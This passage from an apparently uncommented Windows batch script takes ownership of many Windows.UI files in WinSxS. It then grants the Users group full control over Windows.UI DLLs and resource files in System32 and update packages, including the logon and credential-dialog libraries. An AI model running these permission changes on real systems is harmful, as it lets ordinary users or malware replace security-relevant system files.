takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-shellcommoninetcore_31bf3856ad364e35_10.0.22621.2506_none_9b69ece04f913aaa\r\Windows.UI.ShellCommonInetCore.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-storage_31bf3856ad364e35_10.0.22621.2506_none_e5a060a9cdacb713\Windows.UI.Storage.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-storage_31bf3856ad364e35_10.0.22621.2506_none_e5a060a9cdacb713\f\Windows.UI.Storage.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-storage_31bf3856ad364e35_10.0.22621.2506_none_e5a060a9cdacb713\r\Windows.UI.Storage.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-controls_31bf3856ad364e35_10.0.22621.2506_none_f5b704df59c615b7\Windows.UI.Xaml.Controls.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-controls_31bf3856ad364e35_10.0.22621.2506_none_f5b704df59c615b7\f\Windows.UI.Xaml.Controls.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-controls_31bf3856ad364e35_10.0.22621.2506_none_f5b704df59c615b7\r\Windows.UI.Xaml.Controls.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-inkcontrols_31bf3856ad364e35_10.0.22621.2506_none_ae300763e04f821d\Windows.UI.Xaml.InkControls.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-inkcontrols_31bf3856ad364e35_10.0.22621.2506_none_ae300763e04f821d\f\Windows.UI.Xaml.InkControls.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-inkcontrols_31bf3856ad364e35_10.0.22621.2506_none_ae300763e04f821d\r\Windows.UI.Xaml.InkControls.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-maps.resources_31bf3856ad364e35_10.0.22621.1_en-us_a34843c4f40c8799\Windows.UI.Xaml.Maps.dll.mui" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-maps_31bf3856ad364e35_10.0.22621.2506_none_772812a545bd707a\Windows.UI.Xaml.Maps.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-maps_31bf3856ad364e35_10.0.22621.2506_none_772812a545bd707a\f\Windows.UI.Xaml.Maps.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-maps_31bf3856ad364e35_10.0.22621.2506_none_772812a545bd707a\r\Windows.UI.Xaml.Maps.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-phone_31bf3856ad364e35_10.0.22621.2506_none_b080ca702ba5ac7d\Windows.UI.Xaml.Phone.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-phone_31bf3856ad364e35_10.0.22621.2506_none_b080ca702ba5ac7d\f\Windows.UI.Xaml.Phone.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-phone_31bf3856ad364e35_10.0.22621.2506_none_b080ca702ba5ac7d\r\Windows.UI.Xaml.Phone.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-w..immersive.resources_31bf3856ad364e35_10.0.22621.1_en-us_ebb4f7a537d3cc0c\Windows.UI.Immersive.dll.mui" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-w..indowsuiinputinking_31bf3856ad364e35_10.0.22621.2506_none_cf48f5365ec60bd3\Windows.UI.Input.Inking.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-w..indowsuiinputinking_31bf3856ad364e35_10.0.22621.2506_none_cf48f5365ec60bd3\f\Windows.UI.Input.Inking.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-w..indowsuiinputinking_31bf3856ad364e35_10.0.22621.2506_none_cf48f5365ec60bd3\r\Windows.UI.Input.Inking.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-w..putinking.resources_31bf3856ad364e35_10.0.22621.1_en-us_0f4d763dda2a0a70\Windows.UI.Input.Inking.dll.mui" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-windowsuiimmersive_31bf3856ad364e35_10.0.22621.2506_none_11aa38b84fa8c6d1\Windows.UI.Immersive.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-windowsuiimmersive_31bf3856ad364e35_10.0.22621.2506_none_11aa38b84fa8c6d1\Windows.UI.Immersive.dll.mun" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-windowsuiimmersive_31bf3856ad364e35_10.0.22621.2506_none_11aa38b84fa8c6d1\f\Windows.UI.Immersive.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-windowsuiimmersive_31bf3856ad364e35_10.0.22621.2506_none_11aa38b84fa8c6d1\f\Windows.UI.Immersive.dll.mun" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-windowsuiimmersive_31bf3856ad364e35_10.0.22621.2506_none_11aa38b84fa8c6d1\r\Windows.UI.Immersive.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-windowsuiimmersive_31bf3856ad364e35_10.0.22621.2506_none_11aa38b84fa8c6d1\r\Windows.UI.Immersive.dll.mun" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-windowui.resources_31bf3856ad364e35_10.0.22621.1_en-us_311dc6dfeedd4ea4\Windows.UI.dll.mui" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-windowui_31bf3856ad364e35_10.0.22621.2506_none_e7248d3d5f352b03\Windows.UI.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-windowui_31bf3856ad364e35_10.0.22621.2506_none_e7248d3d5f352b03\f\Windows.UI.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-windowui_31bf3856ad364e35_10.0.22621.2506_none_e7248d3d5f352b03\r\Windows.UI.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-xamlhost-library_31bf3856ad364e35_10.0.22621.2506_none_4fc099f70cad6205\Windows.UI.XamlHost.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-xamlhost-library_31bf3856ad364e35_10.0.22621.2506_none_4fc099f70cad6205\f\Windows.UI.XamlHost.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-xamlhost-library_31bf3856ad364e35_10.0.22621.2506_none_4fc099f70cad6205\r\Windows.UI.XamlHost.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_systemresource-wind..-ui-accountscontrol_31bf3856ad364e35_10.0.22621.1_none_33aaad6b477ff550\Windows.UI.AccountsControl.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_systemresource-wind..tscontrol.resources_31bf3856ad364e35_10.0.22621.2506_en-us_49f7e5f780ab82cb\Windows.UI.AccountsControl.en-US.pri" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-onecore-a..sibility-experience_31bf3856ad364e35_10.0.22621.2506_none_75f0813a36133fbb\Windows.UI.Accessibility.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-onecore-a..sibility-experience_31bf3856ad364e35_10.0.22621.2506_none_75f0813a36133fbb\f\Windows.UI.Accessibility.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-onecore-a..sibility-experience_31bf3856ad364e35_10.0.22621.2506_none_75f0813a36133fbb\r\Windows.UI.Accessibility.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-creddialogcontroller_31bf3856ad364e35_10.0.22621.2506_none_1733d97913493d48\Windows.UI.CredDialogController.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-creddialogcontroller_31bf3856ad364e35_10.0.22621.2506_none_1733d97913493d48\f\Windows.UI.CredDialogController.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-creddialogcontroller_31bf3856ad364e35_10.0.22621.2506_none_1733d97913493d48\r\Windows.UI.CredDialogController.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3007_none_a15afe509e6dd482\Windows.UI.Xaml.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3007_none_a15afe509e6dd482\f\Windows.UI.Xaml.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3007_none_a15afe509e6dd482\r\Windows.UI.Xaml.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-inputservice_31bf3856ad364e35_10.0.22621.2792_none_a40c9f1ce9926544\Windows.UI.Core.TextInput.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-inputservice_31bf3856ad364e35_10.0.22621.2792_none_a40c9f1ce9926544\f\Windows.UI.Core.TextInput.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-inputservice_31bf3856ad364e35_10.0.22621.2792_none_a40c9f1ce9926544\r\Windows.UI.Core.TextInput.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_1b150919b7e1e52f\Windows.UI.winmd" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_1b150919b7e1e52f\Windows.UI.Xaml.winmd" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_1b150919b7e1e52f\f\Windows.UI.winmd" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_1b150919b7e1e52f\f\Windows.UI.Xaml.winmd" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_1b150919b7e1e52f\r\Windows.UI.winmd" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_1b150919b7e1e52f\r\Windows.UI.Xaml.winmd" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-s..ink-inkanalysiscore_31bf3856ad364e35_10.0.22621.1_none_b4d146a6237f2ed1\Windows.UI.Input.Inking.Analysis.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-ui-cred-library_31bf3856ad364e35_10.0.22621.2506_none_a97e556342677e17\Windows.UI.Cred.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-ui-cred-library_31bf3856ad364e35_10.0.22621.2506_none_a97e556342677e17\f\Windows.UI.Cred.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-ui-cred-library_31bf3856ad364e35_10.0.22621.2506_none_a97e556342677e17\r\Windows.UI.Cred.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-ui-fileexplorer-wasdk_31bf3856ad364e35_10.0.22621.3007_none_9659e8fa2c1af778\Windows.UI.FileExplorer.WASDK.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-ui-fileexplorer-wasdk_31bf3856ad364e35_10.0.22621.3007_none_9659e8fa2c1af778\n\Windows.UI.FileExplorer.WASDK.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-ui-fileexplorer_31bf3856ad364e35_10.0.22621.3007_none_71594a204b1296b9\Windows.UI.FileExplorer.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-ui-fileexplorer_31bf3856ad364e35_10.0.22621.3007_none_71594a204b1296b9\f\Windows.UI.FileExplorer.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-ui-fileexplorer_31bf3856ad364e35_10.0.22621.3007_none_71594a204b1296b9\r\Windows.UI.FileExplorer.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-ui-search_31bf3856ad364e35_10.0.22621.2506_none_df40491cd30240dd\Windows.UI.Search.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-ui-search_31bf3856ad364e35_10.0.22621.2506_none_df40491cd30240dd\f\Windows.UI.Search.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-ui-search_31bf3856ad364e35_10.0.22621.2506_none_df40491cd30240dd\r\Windows.UI.Search.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-controls_31bf3856ad364e35_10.0.22621.2506_none_000baf318e26d7b2\Windows.UI.Xaml.Controls.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-controls_31bf3856ad364e35_10.0.22621.2506_none_000baf318e26d7b2\f\Windows.UI.Xaml.Controls.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-controls_31bf3856ad364e35_10.0.22621.2506_none_000baf318e26d7b2\r\Windows.UI.Xaml.Controls.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-inkcontrols_31bf3856ad364e35_10.0.22621.2506_none_b884b1b614b04418\Windows.UI.Xaml.InkControls.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-inkcontrols_31bf3856ad364e35_10.0.22621.2506_none_b884b1b614b04418\f\Windows.UI.Xaml.InkControls.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-inkcontrols_31bf3856ad364e35_10.0.22621.2506_none_b884b1b614b04418\r\Windows.UI.Xaml.InkControls.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-maps_31bf3856ad364e35_10.0.22621.2506_none_817cbcf77a1e3275\Windows.UI.Xaml.Maps.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-maps_31bf3856ad364e35_10.0.22621.2506_none_817cbcf77a1e3275\f\Windows.UI.Xaml.Maps.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-maps_31bf3856ad364e35_10.0.22621.2506_none_817cbcf77a1e3275\r\Windows.UI.Xaml.Maps.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-phone_31bf3856ad364e35_10.0.22621.2506_none_bad574c260066e78\Windows.UI.Xaml.Phone.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-phone_31bf3856ad364e35_10.0.22621.2506_none_bad574c260066e78\f\Windows.UI.Xaml.Phone.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-phone_31bf3856ad364e35_10.0.22621.2506_none_bad574c260066e78\r\Windows.UI.Xaml.Phone.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-w..indowsuiinputinking_31bf3856ad364e35_10.0.22621.2506_none_d99d9f889326cdce\Windows.UI.Input.Inking.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-w..indowsuiinputinking_31bf3856ad364e35_10.0.22621.2506_none_d99d9f889326cdce\f\Windows.UI.Input.Inking.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-w..indowsuiinputinking_31bf3856ad364e35_10.0.22621.2506_none_d99d9f889326cdce\r\Windows.UI.Input.Inking.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-w..putinking.resources_31bf3856ad364e35_10.0.22621.1_en-us_19a220900e8acc6b\Windows.UI.Input.Inking.dll.mui" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-windowsuiimmersive_31bf3856ad364e35_10.0.22621.2506_none_1bfee30a840988cc\Windows.UI.Immersive.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-windowsuiimmersive_31bf3856ad364e35_10.0.22621.2506_none_1bfee30a840988cc\f\Windows.UI.Immersive.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-windowsuiimmersive_31bf3856ad364e35_10.0.22621.2506_none_1bfee30a840988cc\r\Windows.UI.Immersive.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-windowui_31bf3856ad364e35_10.0.22621.2506_none_f179378f9395ecfe\Windows.UI.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-windowui_31bf3856ad364e35_10.0.22621.2506_none_f179378f9395ecfe\f\Windows.UI.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-windowui_31bf3856ad364e35_10.0.22621.2506_none_f179378f9395ecfe\r\Windows.UI.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-xamlhost-library_31bf3856ad364e35_10.0.22621.2506_none_5a154449410e2400\Windows.UI.XamlHost.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-xamlhost-library_31bf3856ad364e35_10.0.22621.2506_none_5a154449410e2400\f\Windows.UI.XamlHost.dll" /r /d y
takeown /f "C:\Windows\WinSxS\wow64_microsoft-windows-xamlhost-library_31bf3856ad364e35_10.0.22621.2506_none_5a154449410e2400\r\Windows.UI.XamlHost.dll" /r /d y
icacls "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-a..skmanager.resources_31bf3856ad364e35_10.0.22621.3085_en-us_ebec9472220fccb9\f\Windows.UI.TaskManager.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-advancedtaskmanager_31bf3856ad364e35_10.0.22621.3085_none_8eff6b1166eefbd0\f\Windows.UI.TaskManager.pri" /t /Grant Users:F
icacls "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-appdefaults_31bf3856ad364e35_10.0.22621.3085_none_d303bc8cc4c7d6b7\f\Windows.UI.AppDefaults.dll" /t /Grant Users:F
icacls "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3085_none_970e83de6a05a9fd\f\Windows.UI.Xaml.dll" /t /Grant Users:F
icacls "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3085_none_970e83de6a05a9fd\f\Windows.UI.Xaml.Resources.Common.dll" /t /Grant Users:F
icacls "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-i...appxmain.resources_31bf3856ad364e35_10.0.22621.3085_en-us_be7ed3d378d84149\f\Windows.UI.SettingsAppThreshold.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-i..ntrolpanel.appxmain_31bf3856ad364e35_10.0.22621.3085_none_fad69a9a12776d02\f\Windows.UI.SettingsAppThreshold.pri" /t /Grant Users:F
icacls "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-inputservice_31bf3856ad364e35_10.0.22621.3085_none_9a026182b4fa1065\f\Windows.UI.Core.TextInput.dll" /t /Grant Users:F
icacls "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.3085_none_110acb7f83499050\f\Windows.UI.winmd" /t /Grant Users:F
icacls "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.3085_none_110acb7f83499050\f\Windows.UI.Xaml.winmd" /t /Grant Users:F
icacls "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-s..dminflows.resources_31bf3856ad364e35_10.0.22621.3085_en-us_e22057df2a3d015d\f\Windows.UI.SettingsAdminFlowUIThreshold.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-s..hreshold-adminflows_31bf3856ad364e35_10.0.22621.3085_none_00c4aed399529e96\f\Windows.UI.SettingsAdminFlowUIThreshold.pri" /t /Grant Users:F
icacls "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-s..ncehost.shellcommon_31bf3856ad364e35_10.0.22621.3085_none_28db717fd11ea409\f\Windows.UI.QuickActions.dll" /t /Grant Users:F
icacls "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-s..ndlers-nt.resources_31bf3856ad364e35_10.0.22621.3085_en-us_e1ffbc49d8a9196f\f\Windows.UI.SettingsHandlers-nt.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-s..riencehost.appxmain_31bf3856ad364e35_10.0.22621.3085_none_dcf2fafd7a5e2e6e\f\Windows.UI.SoftLanding.dll" /t /Grant Users:F
icacls "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-s..settingshandlers-nt_31bf3856ad364e35_10.0.22621.3085_none_5dff1e02ce871016\f\Windows.UI.SettingsHandlers-nt.pri" /t /Grant Users:F
icacls "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-u..n-desktop.resources_31bf3856ad364e35_10.0.22621.3085_en-us_1a0228b45205ac4c\f\Windows.UI.ShellCommon.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-u..n-library.resources_31bf3856ad364e35_10.0.22621.3085_en-us_f3f91c5355a1ddd5\f\Windows.UI.Logon.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-ui-fileexplorer_31bf3856ad364e35_10.0.22621.3085_none_670ccfae16aa6c34\f\Windows.UI.FileExplorer.dll" /t /Grant Users:F
icacls "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-ui-logon-library_31bf3856ad364e35_10.0.22621.3085_none_5d6757fbc44d56a2\f\Windows.UI.Logon.dll" /t /Grant Users:F
icacls "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-ui-logon-library_31bf3856ad364e35_10.0.22621.3085_none_5d6757fbc44d56a2\f\Windows.UI.Logon.pri" /t /Grant Users:F
icacls "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-ui-pcshell.resources_31bf3856ad364e35_10.0.22621.3085_en-us_370656fdaee3e5d7\f\Windows.UI.PCShell.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-ui-pcshell_31bf3856ad364e35_10.0.22621.3085_none_f4b7447f323ee4ca\f\Windows.UI.PCShell.pri" /t /Grant Users:F
icacls "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-ui-shellcommon-desktop_31bf3856ad364e35_10.0.22621.3085_none_b4839d6e2e3ceff5\f\Windows.UI.ShellCommon.pri" /t /Grant Users:F
icacls "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-ui-storage_31bf3856ad364e35_10.0.22621.3085_none_e5de8b43cd7cd99c\f\Windows.UI.Storage.dll" /t /Grant Users:F
icacls "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\wow64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3085_none_a1632e309e666bf8\f\Windows.UI.Xaml.dll" /t /Grant Users:F
icacls "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\wow64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.3085_none_1b5f75d1b7aa524b\f\Windows.UI.winmd" /t /Grant Users:F
icacls "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\wow64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.3085_none_1b5f75d1b7aa524b\f\Windows.UI.Xaml.winmd" /t /Grant Users:F
icacls "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\wow64_microsoft-windows-ui-fileexplorer_31bf3856ad364e35_10.0.22621.3085_none_71617a004b0b2e2f\f\Windows.UI.FileExplorer.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.Accessibility.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.AppDefaults.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.BioFeedback.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.BlockedShutdown.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.Core.TextInput.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.Cred.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.CredDialogController.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.FileExplorer.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.FileExplorer.WASDK.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.Immersive.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.Input.Inking.Analysis.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.Input.Inking.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.Logon.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.NetworkUXController.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.PicturePassword.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.Search.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.Shell.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.Shell.Internal.AdaptiveCards.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.Storage.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.Xaml.Controls.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.Xaml.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.Xaml.InkControls.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.Xaml.Maps.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.Xaml.Phone.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.Xaml.Resources.19h1.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.Xaml.Resources.21h1.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.Xaml.Resources.Common.dll" /t /Grant Users:F
